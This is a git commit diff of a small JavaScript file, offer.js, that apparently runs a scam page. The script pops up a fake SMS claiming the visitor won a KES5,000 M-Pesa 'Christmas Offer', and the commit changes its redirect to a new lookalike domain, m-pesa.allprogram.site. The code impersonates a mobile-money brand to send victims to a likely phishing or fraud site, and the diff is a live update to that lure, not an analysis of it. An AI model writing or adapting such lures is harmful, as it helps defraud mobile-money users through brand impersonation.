cd6e0e2a0e2b219c6122424e679a64cfa7d7ae3c
essac5 <154714847+essac5@users.noreply.github.com>
2024-12-07 02:23:56 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'WITHDRAW KES5,000'
-password=prompt('SMS: Congratulations You are among the M-Pesa Customers to receive KES5,000 Offer, Kindly Press OK to withdraw cash now ','WITHDRAW KES5,000');
+password=prompt('SMS: Congratulations You are among the M-Pesa Customers to receive KES5,000 Christmas Offer, Kindly Press OK to withdraw cash now ','WITHDRAW KES5,000');
 if (password != 'WITHDRAW KES5,000') {
-location.href='https://m-pesa.programs.lat/Gifts';
+location.href='https://m-pesa.allprogram.site/Gifts';
 }
